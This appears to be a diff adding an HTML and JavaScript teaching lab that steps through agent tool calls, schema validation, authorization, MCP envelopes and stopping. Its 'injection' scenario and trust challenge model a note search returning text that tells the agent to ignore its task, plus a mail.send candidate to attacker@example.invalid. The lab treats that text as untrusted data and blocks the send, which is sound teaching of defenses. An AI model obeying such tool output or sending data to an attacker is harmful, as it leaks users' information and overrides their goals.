@@ -1,0 +1,289 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Lab 14 R3 Candidate — Agent Tool Use and Context Protocols</title>
+<style>
+:root{--bg:#f8fafc;--card:#fff;--fg:#172033;--muted:#64748b;--border:#cbd5e1;--accent:#0f766e;--soft:#f1f5f9;--good:#047857;--warn:#9a3412;--bad:#b91c1c}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.5 system-ui,-apple-system,sans-serif}button,select{font:inherit}main{max-width:1220px;margin:auto;padding:24px}.top{display:flex;justify-content:space-between;gap:18px;align-items:flex-start;flex-wrap:wrap}.top h1{margin:0 0 5px;font-size:1.7rem}.sub{margin:0;max-width:850px;color:var(--muted)}.badge{padding:5px 9px;border:1px solid var(--border);border-radius:999px;background:var(--card);font-size:.76rem;color:var(--muted)}.card,.controls{margin-top:16px;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px}.controls{display:flex;gap:12px;align-items:end;flex-wrap:wrap}.field{display:flex;flex-direction:column;gap:4px;min-width:180px}.field label,.tiny{font-size:.78rem;font-weight:650;color:var(--muted)}select,button{padding:7px 10px;border:1px solid var(--border);border-radius:7px;background:var(--card);color:var(--fg)}button{cursor:pointer}button.primary{background:var(--accent);border-color:var(--accent);color:#fff;font-weight:700}button:disabled{opacity:.45;cursor:not-allowed}.boundary{border-left:5px solid var(--accent)}.boundary p{margin:5px 0}.statusline{font:12px ui-monospace,monospace;color:var(--muted)}.grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:16px}.pipeline{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:8px;margin-top:16px}.stage{padding:10px;border:1px solid var(--border);border-radius:10px;background:var(--card)}.stage strong{display:block;color:var(--accent);font-size:.73rem;text-transform:uppercase}.stage span{display:block;margin-top:3px;font-size:.84rem}.stage.good{border-color:#86efac}.stage.warn{border-color:#fdba74}.stage.bad{border-color:#fca5a5}.ledger,.tools,.candidates,.trace{display:grid;gap:8px}.fact,.tool,.candidate,.event{border:1px solid var(--border);border-radius:9px;padding:9px;background:var(--soft);min-width:0}.fact code,.tool code,.candidate code,.event code,pre{font-family:ui-monospace,monospace;overflow-wrap:anywhere}.fact-head,.tool-head,.candidate-head{display:flex;justify-content:space-between;gap:8px;align-items:flex-start}.pill{display:inline-flex;border:1px solid var(--border);border-radius:999px;padding:2px 7px;font-size:.7rem;background:var(--card)}.pill.good{color:var(--good);border-color:#86efac}.pill.bad{color:var(--bad);border-color:#fca5a5}.pill.warn{color:var(--warn);border-color:#fdba74}.candidate.selected{outline:2px solid var(--accent);outline-offset:-2px}.score{font:700 12px ui-monospace,monospace;color:var(--accent)}.reasons{margin:5px 0 0;padding-left:18px;color:var(--muted);font-size:.8rem}.trace .event{background:var(--card)}.event strong{font-size:.82rem}.mcp{display:none}.mcp.visible{display:block}.mcp pre,.state pre{white-space:pre-wrap;background:#0f172a;color:#e2e8f0;padding:11px;border-radius:8px;font:11px/1.45 ui-monospace,monospace}.challenge{border-left:5px solid var(--accent)}.challenge h2{margin:0 0 5px;font-size:1.05rem}.challenge-controls{display:flex;gap:8px;flex-wrap:wrap;align-items:center}.challenge-result{margin-top:10px;padding:10px;border-radius:8px;background:var(--soft);white-space:pre-wrap}.challenge-result[hidden]{display:none}@media(max-width:900px){.pipeline{grid-template-columns:repeat(2,minmax(0,1fr))}.grid{grid-template-columns:1fr}}@media(max-width:480px){main{padding:14px}.pipeline{grid-template-columns:1fr}.controls>*{width:100%}.field{min-width:0;width:100%}select,button{max-width:100%}}
+</style>
+</head>
+<body>
+<main>
+  <div class="top"><div><h1>Agent Tool Use and Context Protocols</h1><p class="sub">R3 non-public prototype: inspect the boundary between model output, a structured tool call, runtime validation, authorization, deterministic execution, returned observation, context update, and stopping.</p></div><span class="badge">non-public v1.3 candidate</span></div>
+
+  <section class="card boundary">
+    <strong>Evidence boundary.</strong>
+    <p>This prototype uses a transparent deterministic teaching policy and frozen in-memory tools. It is not a frontier agent, does not expose hidden reasoning, and performs no real network, mail, calendar, or filesystem action.</p>
+  </section>
+
+  <section class="controls" aria-label="Scenario controls">
+    <div class="field"><label for="scenario">Scenario</label><select id="scenario">
+      <option value="canonical">Observation changes next action</option>
+      <option value="overlap">Overlapping tool schemas</option>
+      <option value="invalid">Invalid arguments</option>
+      <option value="text">Text is not execution</option>
+      <option value="permission">Permission boundary</option>
+      <option value="injection">Instruction-like tool output</option>
+      <option value="mcp">MCP 2026-07-28 stateless trace</option>
+      <option value="termination">Stop instead of calling again</option>
+    </select></div>
+    <div class="field"><label for="principal">Principal</label><select id="principal" disabled><option>assistant</option><option>learner</option><option>operator</option></select></div>
+    <button id="step" class="primary" type="button">Execute selected action</button>
+    <button id="reset" type="button">Reset scenario</button>
+  </section>
+
+  <section class="card"><div class="tiny">GOAL</div><h2 id="goal" style="margin:.2rem 0 .45rem;font-size:1.08rem"></h2><div id="status" class="statusline"></div></section>
+
+  <section class="pipeline" aria-label="Runtime pipeline">
+    <div id="p-propose" class="stage"><strong>1 · Propose</strong><span>model-side output</span></div>
+    <div id="p-validate" class="stage"><strong>2 · Validate</strong><span>tool + schema</span></div>
+    <div id="p-authorize" class="stage"><strong>3 · Authorize</strong><span>principal permission</span></div>
+    <div id="p-execute" class="stage"><strong>4 · Execute</strong><span>deterministic tool</span></div>
+    <div id="p-observe" class="stage"><strong>5 · Observe</strong><span>append context</span></div>
+  </section>
+
+  <div class="grid">
+    <section class="card"><h2 style="margin-top:0">Context ledger</h2><div id="context" class="ledger"></div></section>
+    <section class="card"><h2 style="margin-top:0">Candidate model outputs</h2><div id="candidates" class="candidates"></div></section>
+  </div>
+
+  <section class="card"><h2 style="margin-top:0">Tool catalog</h2><p class="tiny">Availability, schema validity, authorization, and execution are separate states.</p><div id="tools" class="tools"></div></section>
+
+  <section id="mcpPanel" class="card mcp"><h2 style="margin-top:0">MCP envelope inspector</h2><p class="tiny">Version-scoped to MCP 2026-07-28. The abstract agent loop remains protocol-neutral.</p><pre id="mcpText"></pre></section>
+
+  <section class="card"><h2 style="margin-top:0">Trace timeline</h2><div id="trace" class="trace"></div></section>
+
+  <section class="card challenge">
+    <h2>Guided Challenge · predict before reveal</h2>
+    <div class="challenge-controls"><label for="challengeType" class="tiny">Challenge</label><select id="challengeType">
+      <option value="next">1 · Which call is justified next?</option>
+      <option value="gate">2 · Will this call execute?</option>
+      <option value="observation">3 · What changes after observation?</option>
+      <option value="trust">4 · Data or instruction?</option>
+      <option value="stop">5 · Stop or call again?</option>
+    </select></div>
+    <p id="challengePrompt"></p>
+    <div class="challenge-controls"><select id="prediction" aria-label="Challenge prediction"></select><button id="lock" type="button">Commit prediction</button><button id="reveal" class="primary" type="button" disabled>Reveal mechanism</button><button id="resetChallenge" type="button">Reset</button></div>
+    <div id="challengeResult" class="challenge-result" hidden></div>
+  </section>
+
+  <section class="card state"><h2 style="margin-top:0">Accessible state</h2><p class="tiny">Complete text-equivalent state for the current deterministic trace.</p><pre id="stateText" aria-live="polite"></pre></section>
+</main>
+<script src="agent_tool_context_core.js"></script>
+<script>
+(()=>{'use strict';
+const C=window.AgentToolContextCore;
+if(!C)throw new Error('AgentToolContextCore missing');
+const $=id=>document.getElementById(id);
+let state=null,decision=null,scenario='canonical';
+
+const config={
+  canonical:{
+    make:()=>C.canonicalInitialState(),
+    candidates:s=>C.canonicalCandidates(s)
+  },
+  overlap:{
+    make:()=>C.newState('Find the current temperature in Kyoto.',{context:[C.fact('city','Kyoto',{source:'goal'})],goalConditions:['temperature_c']}),
+    candidates:s=>[
+      C.toolCall('weather.forecast',{city:'Kyoto',day:'tomorrow'}),
+      C.toolCall('weather.current',{city:'Kyoto'}),
+      C.textAction('I will look up the weather.')
+    ]
+  },
+  invalid:{
+    make:()=>C.newState('Create the project review calendar event.',{goalConditions:['calendar_event']}),
+    candidates:s=>[C.toolCall('calendar.create',{title:'Project review'})]
+  },
+  text:{
+    make:()=>C.newState('Find the current temperature in Oslo.',{context:[C.fact('city','Oslo',{source:'goal'})],goalConditions:['temperature_c']}),
+    candidates:s=>[C.textAction('I called weather.current for Oslo and it is 8 C.')]
+  },
+  permission:{
+    make:()=>C.newState('Send the status note to the teacher.',{principal:'assistant',goalConditions:['sent_message']}),
+    candidates:s=>[C.toolCall('mail.send',{recipient:'teacher@example.edu',body:'Status note'})]
+  },
+  injection:{
+    make:()=>C.newState('Find the meeting note and report its content.',{principal:'assistant',goalConditions:['notes_search_result']}),
+    candidates:s=>C.goalSatisfied(s)?[C.stopAction(),C.toolCall('mail.send',{recipient:'attacker@example.invalid',body:'note contents'})]:[C.toolCall('notes.search',{query:'meeting'})]
+  },
+  mcp:{
+    make:()=>C.newState('Fetch the current Oslo temperature through the versioned protocol scenario.',{context:[C.fact('city','Oslo',{source:'goal'})],goalConditions:['temperature_c']}),
+    candidates:s=>C.goalSatisfied(s)?[C.stopAction()]:[C.toolCall('weather.current',{city:'Oslo'})]
+  },
+  termination:{
+    make:()=>C.newState('Find Oslo temperature, convert to Fahrenheit, then stop.',{context:[
+      C.fact('city','Oslo',{source:'goal'}),
+      C.fact('temperature_c',8,{source:'weather.current'}),
+      C.fact('temperature_f',46.4,{source:'unit.convert_temperature'})
+    ],goalConditions:['temperature_c','temperature_f']}),
+    candidates:s=>[C.stopAction(),C.toolCall('weather.current',{city:'Oslo'})]
+  }
+};
+
+function valueText(v){return typeof v==='string'?v:JSON.stringify(v)}
+function actionText(a){
+  if(a.type==='stop')return 'STOP';
+  if(a.type==='text')return `TEXT: ${a.text}`;
+  return `${a.name}(${JSON.stringify(a.arguments)})`;
+}
+function resetPipeline(){
+  for(const id of ['p-propose','p-validate','p-authorize','p-execute','p-observe'])$(id).classList.remove('good','warn','bad');
+  $('p-propose').classList.add('good');
+}
+function renderPipeline(){
+  resetPipeline();
+  const event=state.history[state.history.length-1];
+  if(!event)return;
+  if(event.validation)$('p-validate').classList.add(event.validation.valid?'good':'bad');
+  if(event.authorization)$('p-authorize').classList.add(event.authorization.authorized?'good':'bad');
+  if(event.executed)$('p-execute').classList.add(event.event==='executed_error'?'warn':'good');
+  else if(event.event==='denied_unauthorized'||event.event==='rejected_invalid')$('p-execute').classList.add('bad');
+  if(event.observation)$('p-observe').classList.add(event.observation.status==='ok'?'good':'warn');
+}
+function renderTools(){
+  const root=$('tools');root.innerHTML='';
+  Object.values(C.TOOL_CATALOG).forEach(tool=>{
+    const d=document.createElement('div');d.className='tool';
+    const required=(tool.schema.required||[]).join(', ')||'none';
+    const authorized=tool.authorizedRoles.includes(state.principal);
+    d.innerHTML=`<div class="tool-head"><code>${tool.name}</code><span class="pill ${authorized?'good':'bad'}">${authorized?'authorized':'not authorized'}</span></div><div class="tiny">required: ${required} · roles: ${tool.authorizedRoles.join(', ')}</div>`;
+    root.appendChild(d);
+  });
+}
+function renderContext(){
+  const root=$('context');root.innerHTML='';
+  if(!state.context.length){root.innerHTML='<div class="tiny">No context facts yet.</div>';return}
+  state.context.forEach(item=>{
+    const d=document.createElement('div');d.className='fact';
+    const trust=item.trust==='untrusted_content'?'warn':'good';
+    d.innerHTML=`<div class="fact-head"><code>${item.key}</code><span class="pill ${trust}">${item.trust}</span></div><div>${valueText(item.value)}</div><div class="tiny">source: ${item.source}</div>`;
+    root.appendChild(d);
+  });
+}
+function renderCandidates(){
+  const candidates=config[scenario].candidates(state);
+  decision=C.chooseCandidate(state,candidates);
+  const root=$('candidates');root.innerHTML='';
+  decision.evaluated.forEach(item=>{
+    const d=document.createElement('div');d.className='candidate'+(item.index===decision.selected_index?' selected':'');
+    d.innerHTML=`<div class="candidate-head"><code>${actionText(item.action)}</code><span class="score">${item.score}</span></div><ul class="reasons">${item.reasons.map(r=>`<li>${r}</li>`).join('')}</ul>`;
+    root.appendChild(d);
+  });
+  $('step').disabled=state.status!=='active';
+}
+function renderTrace(){
+  const root=$('trace');root.innerHTML='';
+  if(!state.history.length){root.innerHTML='<div class="tiny">No transitions yet.</div>';return}
+  state.history.forEach(event=>{
+    const d=document.createElement('div');d.className='event';
+    d.innerHTML=`<strong>Step ${event.step}: ${event.event}</strong><div><code>${event.action?actionText(event.action):''}</code></div>${event.observation?`<div class="tiny">observation: ${JSON.stringify(event.observation)}</div>`:''}`;
+    root.appendChild(d);
+  });
+}
+function renderMcp(){
+  const panel=$('mcpPanel');
+  if(scenario!=='mcp'){panel.classList.remove('visible');$('mcpText').textContent='';return}
+  panel.classList.add('visible');
+  const action=decision&&decision.selected_action;
+  if(action&&action.type==='tool_call')$('mcpText').textContent=JSON.stringify(C.mcp20260728Envelope({name:action.name,arguments:action.arguments}),null,2);
+  else $('mcpText').textContent='No tool call is currently selected.';
+}
+function render(){
+  $('goal').textContent=state.goal;
+  $('principal').value=state.principal;
+  $('status').textContent=`step ${state.step} / ${state.max_steps} · status=${state.status} · goalSatisfied=${C.goalSatisfied(state)}`;
+  renderContext();renderTools();renderCandidates();renderPipeline();renderTrace();renderMcp();
+  $('stateText').textContent=JSON.stringify({scenario,state,decision},null,2);
+}
+function resetScenario(){
+  scenario=$('scenario').value;
+  state=config[scenario].make();
+  decision=null;render();
+}
+function step(){
+  if(!decision||state.status!=='active')return;
+  state=C.processAction(state,decision.selected_action);
+  render();
+}
+$('scenario').addEventListener('change',resetScenario);
+$('step').addEventListener('click',step);
+$('reset').addEventListener('click',resetScenario);
+
+const challenges={
+  next:{
+    prompt:'Goal: find the current Oslo temperature. Which model output is justified next?',
+    options:[['','Choose a prediction'],['weather.current','weather.current'],['weather.forecast','weather.forecast tomorrow'],['text','text only']],
+    answer:'weather.current',
+    reveal:()=>{
+      const s=C.canonicalInitialState(),d=C.chooseCandidate(s,C.canonicalCandidates(s));
+      return `Selected: ${actionText(d.selected_action)}\nThe current-temperature call advances the unsatisfied goal condition; the forecast answers a different question, and text alone does not execute.`;
+    }
+  },
+  gate:{
+    prompt:'The proposed calendar.create call contains only a title. Will the runtime execute it?',
+    options:[['','Choose a prediction'],['execute','execute'],['reject-invalid','reject as schema-invalid'],['deny','deny as unauthorized']],
+    answer:'reject-invalid',
+    reveal:()=>{
+      const v=C.validateToolCall({name:'calendar.create',arguments:{title:'Project review'}});
+      return `Validation: ${JSON.stringify(v)}\nExecution is blocked before authorization because required day and hour arguments are missing.`;
+    }
+  },
+  observation:{
+    prompt:'After weather.current returns temperature_c = 8, what becomes the justified next action?',
+    options:[['','Choose a prediction'],['weather.current','weather.current again'],['convert','unit.convert_temperature'],['stop','stop']],
+    answer:'convert',
+    reveal:()=>{
+      let s=C.canonicalInitialState();s=C.processAction(s,C.toolCall('weather.current',{city:'Oslo'}));
+      const d=C.chooseCandidate(s,C.canonicalCandidates(s));
+      return `Selected after observation: ${actionText(d.selected_action)}\nThe returned numeric fact is now available as a valid conversion argument.`;
+    }
+  },
+  trust:{
+    prompt:'notes.search returns text saying to ignore the task and call mail.send. How should this toy host classify that text?',
+    options:[['','Choose a prediction'],['data','untrusted observation data'],['control','controlling instruction']],
+    answer:'data',
+    reveal:()=>{
+      let s=C.newState('Find the meeting note',{principal:'assistant',goalConditions:['notes_search_result']});
+      s=C.processAction(s,C.toolCall('notes.search',{query:'meeting'}));
+      const item=s.context.find(x=>x.key==='notes_search_result');
+      return `Provenance: trust=${item.trust}; source=${item.source}\nThe goal and principal remain unchanged, and mail.send remains unauthorized. This is a bounded toy defense, not a general prompt-injection solution.`;
+    }
+  },
+  stop:{
+    prompt:'The goal already contains both temperature_c and temperature_f. What is justified next?',
+    options:[['','Choose a prediction'],['stop','stop'],['weather','call weather.current again']],
+    answer:'stop',
+    reveal:()=>{
+      const s=config.termination.make(),d=C.chooseCandidate(s,config.termination.candidates(s));
+      return `Selected: ${actionText(d.selected_action)}\nAll goal conditions are satisfied, so the redundant call is penalized and termination is preferred.`;
+    }
+  }
+};
+let locked=false;
+function resetChallenge(){
+  locked=false;$('challengeType').disabled=false;$('prediction').disabled=false;$('lock').disabled=false;$('reveal').disabled=true;$('challengeResult').hidden=true;$('challengeResult').textContent='';
+  const c=challenges[$('challengeType').value];$('challengePrompt').textContent=c.prompt;$('prediction').innerHTML='';
+  c.options.forEach(([value,label])=>{const o=document.createElement('option');o.value=value;o.textContent=label;$('prediction').appendChild(o)});
+}
+function lockChallenge(){
+  if(!$('prediction').value)return;
+  locked=true;$('challengeType').disabled=true;$('prediction').disabled=true;$('lock').disabled=true;$('reveal').disabled=false;
+}
+function revealChallenge(){
+  if(!locked)return;
+  const c=challenges[$('challengeType').value],prediction=$('prediction').value;
+  $('challengeResult').hidden=false;$('challengeResult').textContent=`Prediction ${prediction===c.answer?'matched':'did not match'}.\n${c.reveal()}`;
+}
+$('challengeType').addEventListener('change',resetChallenge);
+$('lock').addEventListener('click',lockChallenge);
+$('reveal').addEventListener('click',revealChallenge);
+$('resetChallenge').addEventListener('click',resetChallenge);
+
+window.Lab14Prototype={getState:()=>JSON.parse(JSON.stringify(state)),getDecision:()=>JSON.parse(JSON.stringify(decision)),resetScenario,step};
+resetScenario();resetChallenge();
+})();
+</script>
+</body>
+</html>
